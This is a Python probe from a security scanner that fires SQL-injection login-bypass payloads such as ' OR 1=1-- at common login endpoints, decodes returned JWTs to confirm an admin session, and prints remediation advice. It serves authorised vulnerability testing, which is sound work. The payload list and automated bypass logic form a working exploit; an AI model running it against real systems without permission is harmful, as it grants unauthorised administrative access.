#!/usr/bin/env python3
# Author: Tim Rice <tim.j.rice@hackrange.com>
# Part of nextgen-dast. See README.md for license and overall architecture.
"""
Authentication: SQL injection in the login form yielding a privileged
session.

sqlmap's data-extraction focus means it routinely flags `' OR 1=1--`
on a login endpoint as "Boolean-based blind injection" — but it
stops there. The high-fidelity finding is whether the SAME injection
ACTUALLY ISSUES A PRIVILEGED SESSION TOKEN. That's two distinct things:
  (a) the parser was tricked (sqlmap's domain)
  (b) the resulting session, when decoded, encodes administrative
      authority (`role: admin`, `is_admin: true`, etc.)

This probe sends one tiny SQL payload to common login endpoints, looks
for a session token in the response, decodes it as a JWT, and verifies
the role claim. Fail-loud verdict — high confidence on success, clean
refutation when no token comes back.

Tested against:
  + OWASP Juice Shop  POST /rest/user/login {"email":"' OR 1=1--",
                       "password":"x"} → 200 + JWT decoding to
                       data.email=admin@juice-sh.op data.role=admin
                       → validated=True
  + nginx default site                                    → validated=False
"""
from __future__ import annotations

import base64
import json
import sys
from pathlib import Path
from urllib.parse import urljoin, urlparse

sys.path.insert(0, str(Path(__file__).parent.parent))
from lib import Probe, Verdict, SafeClient   # noqa: E402


# Login endpoints to probe — ordered most-specific first.
LOGIN_PATHS = (
    "/rest/user/login",     # Juice Shop, many Express apps
    "/api/auth/login",
    "/api/login",
    "/login",
    "/auth/login",
)

# Classic auth-bypass payloads. We pair an email and a password that
# together would short-circuit the AND in `email='?' AND password='?'`.
# Each is one POST per login path; the probe stops on the first one
# that returns a JWT decoding to admin.
SQLI_PAYLOADS = (
    ("' OR 1=1--",          "x"),
    ("' OR '1'='1",         "x"),
    ("admin'--",            "x"),
    ("admin' OR '1'='1",    "x"),
    ('" OR "1"="1',         "x"),
)

_ADMIN_ROLE_VALUES = {"admin", "administrator", "root", "superuser",
                      "superadmin", "owner"}


def _b64url_decode(s: str) -> bytes:
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s.encode("ascii"))


def _decode_jwt(token: str) -> dict | None:
    parts = token.split(".")
    if len(parts) != 3:
        return None
    try:
        return json.loads(_b64url_decode(parts[1]))
    except (ValueError, json.JSONDecodeError):
        return None


def _looks_admin(payload: dict) -> tuple[bool, str | None]:
    """Walk one level deep looking for an admin role claim. Same shape
    as auth_default_admin_credentials._looks_admin so two probes with
    similar JWT-decoding logic stay consistent."""
    def _check(d: dict) -> tuple[bool, str | None]:
        for key in ("role", "roles", "groups"):
            v = d.get(key)
            if isinstance(v, str) and v.lower() in _ADMIN_ROLE_VALUES:
                return True, f"{key}={v!r}"
            if isinstance(v, list):
                for item in v:
                    if isinstance(item, str) and item.lower() in _ADMIN_ROLE_VALUES:
                        return True, f"{key} contains {item!r}"
        for flag in ("is_admin", "isAdmin", "admin", "superuser"):
            if d.get(flag) is True:
                return True, f"{flag}=true"
        return False, None
    ok, why = _check(payload)
    if ok:
        return True, why
    for v in payload.values():
        if isinstance(v, dict):
            ok, why = _check(v)
            if ok:
                return True, why
    return False, None


def _extract_jwt(doc) -> str | None:
    """Find the issued JWT in arbitrary login responses. Apps put the
    token at root, under `data`, or under `data.authentication`."""
    if not isinstance(doc, dict):
        return None
    for k in ("token", "access_token", "id_token"):
        if isinstance(doc.get(k), str):
            return doc[k]
    for v in doc.values():
        if isinstance(v, dict):
            for k in ("token", "access_token", "id_token"):
                if isinstance(v.get(k), str):
                    return v[k]
            auth = v.get("authentication")
            if isinstance(auth, dict) and isinstance(auth.get("token"), str):
                return auth["token"]
    return None


class SqlLoginBypassProbe(Probe):
    name = "auth_sql_login_bypass"
    summary = ("Detects SQL injection in the login form yielding a "
               "privileged session token (decoded JWT confirms admin role).")
    safety_class = "read-only"

    def add_args(self, parser):
        parser.add_argument(
            "--login-path", action="append", default=[],
            help="Additional login URL path to probe (repeatable).")

    def run(self, args, client: SafeClient) -> Verdict:
        if not args.url:
            return Verdict(ok=False, error="--url is required")
        parsed = urlparse(args.url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        login_paths = list(LOGIN_PATHS) + list(args.login_path or [])

        attempts: list[dict] = []
        confirmed: dict | None = None

        for path in login_paths:
            url = urljoin(origin, path)
            for email, pw in SQLI_PAYLOADS:
                body = json.dumps({"email": email, "password": pw}).encode()
                r = client.request(
                    "POST", url,
                    headers={"Content-Type": "application/json"},
                    body=body,
                )
                row: dict = {"login_path": path, "payload": email,
                             "status": r.status, "size": r.size}
                # Lockout-awareness — same pattern as the other auth probes
                if r.status == 429:
                    row["aborted_reason"] = "rate-limited"
                    attempts.append(row)
                    break
                if r.status == 200 and r.body:
                    try:
                        doc = json.loads(r.text)
                    except json.JSONDecodeError:
                        attempts.append(row); continue
                    token = _extract_jwt(doc)
                    if token:
                        payload = _decode_jwt(token) or {}
                        is_admin, why = _looks_admin(payload)
                        if is_admin:
                            row.update({"sqli_succeeded": True,
                                        "jwt_admin_claim": why})
                            confirmed = row
                            attempts.append(row)
                            break
                attempts.append(row)
            if confirmed:
                break

        evidence = {"origin": origin, "attempts": attempts}
        if confirmed:
            return Verdict(
                validated=True, confidence=0.97,
                summary=(f"Confirmed: SQL injection in login form at "
                         f"{origin}{confirmed['login_path']} issued an "
                         f"administrative session for the payload "
                         f"{confirmed['payload']!r} "
                         f"(JWT claim: {confirmed['jwt_admin_claim']})."),
                evidence={**evidence, "confirmed": confirmed},
                severity_uplift="critical",
                remediation=(
                    "Replace the login query with a parameterised "
                    "prepared statement — `SELECT id FROM users WHERE "
                    "email = ? AND password_hash = ?` with bind variables, "
                    "never string concatenation. Even if the column "
                    "tested is salt-and-hash compared in application "
                    "code, the SQL layer must never accept user input "
                    "directly. Add a regression test that fires the "
                    "exact payload above and asserts an HTTP 401 with "
                    "no session token.\n"
                    "Also rotate any sessions issued during the window "
                    "the bug was reachable — an attacker who hit this "
                    "before the fix already has a valid admin JWT."),
            )
        return Verdict(
            validated=False, confidence=0.85,
            summary=(f"Refuted: {len(attempts)} SQLi-login attempts "
                     f"across {len(login_paths)} paths on {origin}; "
                     "no admin session was issued."),
            evidence=evidence,
        )


if __name__ == "__main__":
    SqlLoginBypassProbe().main()
